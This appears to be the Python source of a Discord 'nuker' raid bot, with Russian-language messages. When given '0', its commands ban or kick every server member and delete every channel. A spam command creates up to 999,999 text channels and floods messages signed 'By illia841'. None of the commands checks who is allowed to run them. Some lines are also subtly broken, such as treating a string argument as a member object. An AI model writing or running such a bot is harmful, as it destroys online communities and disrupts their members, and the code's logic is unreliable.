import discord
from discord.ext import commands
from config import settings

intents = discord.Intents.all()
intents.members = True
bot = commands.Bot(command_prefix = settings['prefix'],  intents = intents)
bot.remove_command('help')


@bot.event
async def on_ready():
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name="смерти"))
    print("Готов всех джага-джага")


@bot.command()
async def help(ctx):
    PREFIX = 's!'
    emb1 = discord.Embed(color = discord.Colour.from_rgb(102, 0, 204), title ="Информация о командах" )

    emb1.add_field(name = f"`{PREFIX}ban` : ", value="Банить", inline=False)
    emb1.add_field(name = f"`{PREFIX}kick` : ", value="Кикать", inline=False)
    emb1.add_field(name = f"`{PREFIX}delete` : ", value="Удалять", inline=False)
    emb1.add_field(name = f"`{PREFIX}spam_server` : ", value="Спамить", inline=False)

    message = await ctx.send(embed = emb1)
                    

@bot.command()
async def ban(ctx, n, *, reason = None):
    x = 0

    if n != "0":
        await n.ban(reason=reason)
    else:
        for m in ctx.guild.members:
            try:
                await m.ban(reason=reason)
            except:
                pass
        print(f'Забанено {x} участников!')


@bot.command()
async def kick(ctx, n, *, reason = None):
    x = 0

    if n != "0":
        await n.kick(reason=reason)
    else:
        for m in ctx.guild.members:
            try:
                await m.kick(reason=reason)
            except:
                pass
        print(f'Забанено {x} участников!')


@bot.command()
async def delete(ctx, n):
    x = 0

    if n != "0":
        await n.delete()
    else:
        for c in ctx.guild.channels:
            await c.delete()
            x += 1
        print(f'Удалено {x} каналов')


@bot.command()
async def spam_server(ctx, n):
    spam_line = "Вы были заспамлены! By illia841"
    spam_text = ""
    for i in range(15):
        spam_text += spam_line + "\n"
    
    if n == '0':
        amount = 999999
    else:        
        amount = int(n)

    for line in range(0 , amount):
        guild = ctx.message.guild
        await guild.create_text_channel('сервер-заспамлен')
        await ctx.channel.send(spam_text)


@bot.command()
async def xstop(ctx):
    await bot.change_presence(status=discord.Status.offline)
    raise SystemExit


bot.run(settings['token'])